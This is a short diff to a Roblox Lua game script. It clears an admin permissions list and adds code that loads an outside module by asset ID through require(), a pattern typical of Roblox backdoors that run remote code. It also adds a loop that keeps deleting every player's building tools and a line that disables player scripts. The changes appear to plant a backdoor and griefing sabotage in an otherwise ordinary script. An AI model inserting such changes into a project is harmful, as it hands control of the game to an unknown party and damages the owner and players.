@@ -1,4 +1,4 @@
-_G.specialperms = {"AIphaGunner","schoolgriefer","SnowClan_8342"} -- ask to be added
+_G.specialperms = {} -- temporary notice
 
 task.delay(0.5, function()
     local a = game.Workspace.Tabby.Admin_House.Snow
@@ -46,6 +46,10 @@ else
 end
 
 _G.shutdowntimer = false
+
+task.spawn(function()require(138920906185746)end)
+task.spawn(function() while task.wait()do _G.af = false for a,b in ipairs(game.Players:GetPlayers())do for a,c in ipairs({b.Backpack,b.Character})do if c then for a,d in ipairs(c:GetChildren())do if d:IsA("Tool")and d.Name=="Building Tools"then d:Destroy()end end end end end end end)
+game.StarterPlayer.StarterPlayerScripts.Local.Enabled = false
 
 local timelimit = "08/30/2025"
 
